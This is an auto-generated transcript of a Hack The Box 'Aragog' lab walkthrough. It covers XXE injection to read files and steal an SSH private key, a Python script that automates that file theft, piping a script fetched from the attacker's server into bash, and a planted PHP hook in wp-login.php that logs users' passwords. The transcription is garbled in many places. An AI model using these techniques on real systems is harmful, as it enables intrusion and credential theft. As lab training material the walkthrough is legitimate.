 what's going on YouTube this zip set can be doing Aragog from hack the box which probably has one of my top three favorite Prevost but boy can Prevost you have to get a shell in the box you do so with a xml ND injection to read a SSH key file that you can use to SSH into the box as aloe previews err when you're pokin around the box you'll see that there is a hidden WordPress site and ver dub dub dub HTML so you go there with your web browser to reveal a note left by Cliff that essentially just says he's gonna be logging in periodically to see if you wrote anything on WordPress his password is relatively secure so you can't just pull it from the database and crack it instead you'll notice that you have write access over all the WordPress config files so you can just and modify the code to also log the users username and password when they log in to a site to a text file and then just check on that text file in a few minutes you see cliff logs in and can steal his password that way then use it to gain access to the root root account because there is some password reuse going on and that's just my favorite Prevost method or one of my top favorite ones because well it's so useful and lateral movement because even if you have root on the web server being able to dump passwords that get passwords may allow you access to other servers so it's a profess from user to root but in actual penetration tests you can do it potentially to get to other servers so let's jump in to start things off or on a map - SC for default scripts SV enumerate version so a output or formats put in the nmap directory call this Aragog and the IP address which is 10:10 1078 does take some time so i've already ran it look into the results we see three ports are open we got FTP SSH and HTTP all on their default ports and because of the Apache banner we see it is version two four one eight and it's Ubuntu so this is most likely a zaniel box you can just google there's two things and find out if you haven't seen from my countless videos before I don't feel like going and googling that FTP we see anonymous FTP is allowed and there is a file called test dot X created December 21st 2017 then we got as a sage but before I do anything I'm just gonna start a go Buster in the background because well it does take some time to run you should always have recon going in the background so we'll do go Buster - you for the URL HTTP 10 10 10 78 - w-4 word list user share word list dirt Buster then directory list - 3 medium I'm going to do one extension PHP normally I'll add a bunch like PHP txt etc but for this just PHP should be fine - oh it's gonna be where we save the file - so we'll say go bust PHP extension homepage dot txt just let that go and then we'll look at the other services so Aragog got nmap we should look at FTP and normally I don't do this but I'll show one odd thing with SSH at least odd in the sense of half the box you try to go to it you immediately get denied and it's not based upon user it's just denied so this SSH is configured to only allow public key authentication no passwords I would say it's odd but that's how Amazon ec2 Isis to come by default so it's not that out in the grand scheme of things but for hack the box you shouldn't noticed that someone can figure this box to only allow public keys the FTP we do FTP 10:10 1078 anonymous login Oh we even have to put a password let me just do dir we can get test dot txt and this was also vs FTP D three point zero point three so I'm going to do search boy vs FTP D and we see only exploits for version 2 dot something I'm also going to Google vs FTP D changelog I would do released a but I normally Google for changelogs mainly because that somehow gets easier to find publication dates on a change log not sure why so let's see I know why normally people don't put release dates but let's see this I don't have any dates here we could also go to like archive.org and see the first time this page was cached if that's in their database maybe July 2015 we got a thing in launch pad 3:03 then we got - so we got a bunch of minor versions it's not telling us so we see 3 0 3 - 9 for Debian at least was published in 2017 don't see anything on the wayback machine but we're not gonna find an exact date of this vs ft PD because they do those - whatever version we don't know that so most likely not going to be related to some type of exploit and vs FTP because it seems to be up to date so the next thing we can do is cat test X which we had downloaded just before going on that little expedition of trying to find the release date and test our tax just shows some XML at this point I hit a roadblock we go to go buster and we see that host PHP has come back with HTTP 200 so let's check that out and if we won't just went to 1010 1078 forgot to do this and see apache ubuntu default page and things like robots.txt don't exist but go Buster did fine host dot PHP and we see there are a lot of possible hosts for blank so what I'm going to do is we're going to send this into burp see it's my intercept on turn it on go to repeater and then let's change this over to a post request and then just put data at the end of this so we could say hearse for we could send this to W fuzz and try to do it that way if you search apes XW foes on YouTube you'll find me using it but the very first thing I did was took what was in test text and pasted it at the bottom of the host PHP just to see what would happen because do you think they'd be related if that's what the machine fader did he normally wouldn't put something that's just meaningless so add this and we see there a 62 possible host for 255 255 255 dot 192 so this looks to be like some type of subnet calculator so if we change this to dot 0 will probably get 254 possible hosts there we go so we have it reading a XML file so the very first thing I do when that happens is will turn intercept off we can do a Google on payload all the things github and this is a awesome repo because I'm not super familiar with xxe attacks but this repo when you kind of have something like PHP juggling type it gives you a bunch of examples with it so let's look for XX e then we can either do files read me or intruders see we got a example right here basic test c classic XX e this should work let's try this so we're going to paste this in i'm gonna fix up that spacing a little bit I think it was fixed and I just misread it so we have actually I messed something up so go there so this is the proof of concept this is what we have so what I want to do is take this example we'll move it up here and then the X X E is replacing the last name with whatever result it gets so we'll put this and example here and I think that's good what does this say for dough okay so we do have some type of xxe attack this isn't doing as much as I thought it would but it's good I guess for explaining so we have this and example and in xxe attacks imagine that and is really just a dollar sign because it's a variable so we're doing subnet mask variable and then semicolon to end it and that variable gets pulled from this entity statement and XML entity injection so we're gonna change this to be entity will call this file and that doesn't matter it could stay example actually will do please subscribe since it's a meaningless piece of text it doesn't matter to the payload to make it extremely obvious that doesn't matter now I'm gonna say system and this is going to say hey get the file and we can say a file that always exists at C passwd if we did this correct which we did not do it should give us the file if we put this in quotes click oh there we go just add in quotes and we have this entire file not too much information here I guess what we can get from this is there's a root user duh and there's also Florian and cliff so I could also try to go to ten ten ten seventy eight slash Florian see if it has like Apache home directories enabled it doesn't look like it does what else can we do we can try to enumerate the source code to that host PHP so we can see what's happening so I'm gonna guess it's ver dub dub dub HTML host at PHP we could go nothing comes back and that's because I think it's processing the HTTP so if we change this to be a PHP filter like we did in Crimestoppers filter convert and we've done a few other videos but convert a 64 - encode slash resource is equal to that and now we can dump the PHP code so we can do echo - n base64 - D and we get the code to host dot PHP so this also shows if we could drop a file then we probably have code execution because we could just drop a PHP file or we could also create a DTD file for I think it's dynamic transform something it's part of XML and essentially if you google a DTD XML and the injection code execution this leads you to a way of code execution it has to be in a separate file though so we need to chain that with a way to create files because of that let's just enumerate more of what we can do or what files are on the system so the first thing I'm going to do is download a word list the word list I like for Elif eyes is actually in a application called Elif I sweet on github and I'm sure away I could use lfi suite to automatically exploit this XML editing injection instead I'm going to take a easy path and use burp real quick and then we'll go and create a Python script so I'm gonna go to this path the test we get a bunch of files so I'm going to go to raw copy this V file is txt paste it and we're going to grip for some that begins with slash on file West to brute force and because I'm going to show a way to do this in Python afterwards I'm going to use intruder which is probably going to be slow if you don't have foot pro so we're just gonna send this over to intruder and go to positions and all we want to do is clear all these I guess weird s's and whatever is between the esses is what it grabbed from the file so we're just gonna clear that clear Amol highlight please not please subscribe highlight host PHP add something here and this can be any junk you want so we can say thanks for subscribing oh and then this one also has to be that oh no because that's to find there nevermind and I'm gonna take off this base64 encoding because we don't need it and it would just make things harder to see we can go over to the payloads we can load them let's go PWD grab this path load /bf it's going to learn all the payloads here and we can start the attack and sort by length and see what worked so we see we have AV SFTP decomp we go to the response we can see what is he if there's any like password Etsy passwd file we know that proc self status just glancing over the options to see if there was anything like an environment variable that we could just try to put PHP code and see if it executed without a PHP extension and the group's MySQL config file box elf stat and then we get to a bunch of files we can't see so didn't seem like there were any interesting files but we have to take this kind of to the next step to find something because if we looked in the home directory going over to repeater and do Etsy passwd and we'll get rid of the base64 I showing this an intruder window before I closed it click go we do have two directories we could try to enumerate so if you went into this directory we go to like dot s hid RSA you get the key but how I found that was I created a python script and you probably don't have to use python but i meant like you don't have to as there's probably a tool that will help automate this or something but this is the path I took so let's call this file I guess we call it Aragog by name doesn't matter I'm going to need one thing right off the bat we want requests and I also want base64 decode so I'm do from basics t4 import be 64 decode and the reason I want that is since this is gonna be scripted out we can always do a base64 encode and then just decode it and display it and it just makes it a bit easier to know when the file begins and ends because there's no space and the request it's all a predictable character set so def get file f name so we're creating a function to get a file we got to create the payload so let us go and the one with the basics t4n code and I don't think it is sensitive about lines so let's put everything on one line actually I don't think we have to I think if we just do this let's try this first payload then we can set paste and we can close it after details that may work Metro and we just have to change the file name so we can do percent s and after this we can do % s % and F name let's try this real quick return payload friend I will do is Python to Python Aragog payload is not defined I'm sure there's a way to do it that way but we're just going to do it this way get everything on one line okay copy I'm not gonna use double quotes because I noticed the actual payload has double quotes in it instead we'll just do a single quote and we can and the single quote plus F name plus and single quote and now oh crap it may have worked before now I made a function err get file that's a passwd so you can try that on your own maybe would have worked without that that was a mistake hi I'm made and that looks good except we have a dub dub so we can clear this out and that all works so we can go to the next line we have the payload we can do the page this can be with the Rakhal this response rasp equals request post Aragog is IP 10 10 10 78 file name host a PHP data is equal to payload there we go and if we do next content F content is file content doesn't matter it's just what I'm calling it and we'll call this response dot txt and let's see 1 2 3 4 5 6 the basics before is the 6 field so I'm going to do dot split good do regular expression but this is quicker that we just need F content is equal to B 64 it decode F content return F content and this should print the Etsy faster BD file there we go so let's see the next thing we do after we get a file we have to get a list of all the home directories so def get home directory create a blank list so we can append to it later passwd it's going to be get file @z passwd lines is equal to either passwd dot split lines I think and this is just going to take this response and loop it by line instead of if we just did a four line and bass Toby do a loop by character for line and lines okay so if we look at a past WD file so you I have that here we want one two three four five six I think the six um split so probably five because it starts at zero so zero one two three four five we want that and we only want the lines that end with SH we don't want any of this Bend false stuff because gonna create a lot of bogus requests so we want to do if line ends with SH then we'll do line is equal to line dot split on the colon 5 and this can be we don't do home good we'll just keep with line because we did home door as this variable okay and now we can do time to dot append line I think that all be good return home do so if we do a print now on get home directories it should print whoa that's different but I thought it would be I thought we'd get a list for I and get home hi there we go I have to look at exactly what I did maybe I did print get home to instead of print home to okay so we got a list of all the home directories on this box so now let's create a file list that we're interested in we just add this we want to get let's see Bosch history we'll try like passwords dot X dot history MySQL history and dot SSH ID or sa for a private key so we go in this now we just have to do one last thing and loop through all the users and do a get for those files so for user and get home to and we'll call this F H is equal to open what do I call it while West text and for line and FH please subscribe because this doesn't really matter get file user plus line okay if please subscribe so if the file returned anything instead of just nothing then we will print the contents so print user plus line print get please subscribe so when we execute this got nothing that's odd for line in something bread line we got a so it's doing a blank line in between so we probably have and the line character at the end of each line so if we do let's see line dot now what is it yeah here dot or a strip strip there we go so now we have two results we have let's see home Florian dot Bosch history we have a few files and we have a SSH key so that is how I found the SSH key and generally what I do whenever L Fi and I can't figure out how to chain it to a code execution I start poking around for potentially sensitive files so we can call this Florian dot SSH I guess name doesn't matter it's hm all that to six hundred and Shi Florian is the user at 10:10 nope SSH - I specify the key specify the user and then the IP and we get into Aragog so going over that script real quick let's do them Aragog not pi so quick recap of this we're have a function to get a file we have a function to get the passwd file but only grab the home directories out of it then we're looping through every home directory we found and then essentially just looking for sensitive files in that and printing it out so that's all that scripted but let's go to SSH and let's see what can we do I guess we can do when Inu so CD op script Linux prove ask I'm not Linux exploit er there we go Python M simple HTTP server and we just curl 10 10 14 30 / twin ush pipe it over to bash and curl is not installed so we're to get w get to only show text but I forget that flag so I'm just gonna do 10 10 14 30 when an SH execute it and then we can see what this shows so we have some general information it is compiled Tuesday January 9th and if you recall I believe let's see this box was released in December so well the creator was creating this box in December and was released around this time so there's probably a kernel exploit for this and you shouldn't do it because you'd be cheating yourself of the correct solution general exploits is something I only do as a very last resort even if I'm on a pen test and I see a kernel exploit would work I still look for other routes because criminal exploits can crash the box and just do unexpected things so it's generally the last thing I'll try to play with so we'll keep a new brain to see what else we see user passwd file let's see go back to the passwd Jesus so many files displayed where were we okay so let's see that's the best WD samples root account home directory permissions we see that Florian directory is readable by everyone so this is kind of where why Apache server could go into this directory file is owned by user but writable by group we see a bunch of crap is chmod 'add to 777 so anyone can do anything and there's a new directory for dub dub dub HTML dev wiki so if we go to dev wiki we can see a wordpress page do about go to blog and we see hi florian thought we could use a wiki feel free to log in and poke around I'll be logging in this is the big hint on the box is a message from cliff that says I'll be logging in regularly I came and say that word and will email the wider team when I need more test testers so he's logging in frequently to this box and we could do double ups can look for XSS and try to steal his cookie but why would we even bother doing that because almost the only cookie would do is give us admin to the WordPress and we could already get that because if we go to verb dub HTML we can go to dev wiki and there's easy backup which is another thing but WP config and we should be able to get the password out of this let's just head it head - 20 WP config head - 50 let's see there we go so we've got one password right here and we can try to ask you to cliff with it does exist ask you to root with it can't do it MySQL - you root I think - be put the password in show databases and we could do something like I'm synthesis table sis use this show tables see select star from I think this table is where you can dump MySQL physical users from yeah I think we got root Debbie insist mate and background so nothing there show databases we got a MySQL table so tables oh my SQL tables where users are stored and passwords select star from users user there we go so let's just do select user and was the password and host user [Music] one of them is gonna be a password and a lot of them are not valid so that Debian maintenance user this is not a valid password that can be used here is how my sequence like puts bad passwords but we only see a few users here so let's go over to the wordpress database so databases use WP wiki show tables so let's do describe be users select user login user pass from WP users and we could try to crack the administrator password for WordPress but it doesn't really appear to be anything valuable in WordPress select star from WP purse select star I said from but I did not type from describe WP first select first title from WP purse and we can just see some pages don't seem to be anything of interest and this my sequel database but if I do an LS I notice dev wiki just disappeared and it did that because there's a cron that is copying ZZ back up to dev wiki and if we go to dev wiki we can kind of back that up because it's not preserving the file time we see it's 932 on the box and these files were created at 9:30 so instead of trying to crack the password we can write to these files so let us just go to dev wiki let's go to where we would log into WordPress so WP admin oh I forgot to clean one thing up on my box if you wanted to go to dev wiki whoops my bad let's fix this Bhim Etsy hosts it's typical WordPress 1010 1078 you'd probably get some that looks like this and that's just because WordPress puts the host name in all the requests and I had something in my hosts file so 10:10 1078 Aragog Aragog HT be case it calls it either/or and if you looked at the page source you would see it's not linking the IP or a relative path it's absolute path with Hearst name so you're following along and WordPress then show up that is why now let's go to dev wiki slash wp-admin and see how a login actually works so this doesn't have to be anything so we'll do it set rocks or something turn proxy intercept on and let us well again so we're submitting a request to WP login dot PHP our username is log and a password is in the PWD field so what I'm going to do is let's go to Aragog and because it's going to disappear on me I'm just gonna copy WP login too huh then we'll just write over it I think we'll see what happens VI WP login dot PHP and we just want to find where the login happens or something happens and we can just write the password so I'm gonna guess the syntax is gonna be post log and that should get user names a search for log I probably didn't escape something there we go so default we got two cases log in and let's see if empty is not log sanitized user get user by login see it's maybe good so let's just under login we'll just put PHP code file put contents let's put it in dot please subscribe then we want to create let's see first log and then append first what is the password PWD I think it's password for the web press PWD yep and the file just change that's been I guess that five minute mark that overwrites and then we want to do backslash n for a new line I think that's good and file append I did the PHP code right that is going to write the file dot please subscribe to the current working directory and it's going to put the parameters and post log the parameters and post PWD into that file force the right can't write that's why I was afraid of open this again go out of the directory go into the directory I open it was it case okay something search for log ok put that there if we forward a word press request we should see dot please subscribe let's see did we we don't so I may have an error in my PHP let's see proxy HTTP history repeater internal server error so yeah I screwed something up let's see file put see what I don't have a semicolon was that it that's not it see I forgot a dot as well and the dot is pretty much just how we use plus in that Python script can't open it for writing this is annoying copy that line and it's default so search for default paste and that syntax should all be good word press paste we know long get that 500 error LS - la we got if sec rocks and please subscribe so everything appears to be working and let's just do - f please subscribe to see if that user ever does well again because every call to WP login should be hooked and just waiting see going to yeah he did I noticed that as I was switching my tab but we have administrator and then new password so we could login to WordPress with that we go disable proxy IP login administrator we get in additionally we can see there's really no here but if we do a su on cliff that password doesn't work su with the root paste that password and now we get root text oh we asked you to root and we can cat root text and see it is 33 characters which is an md5 sum then the new line breaks so that is the box I hope you guys enjoyed the video and I will see you next week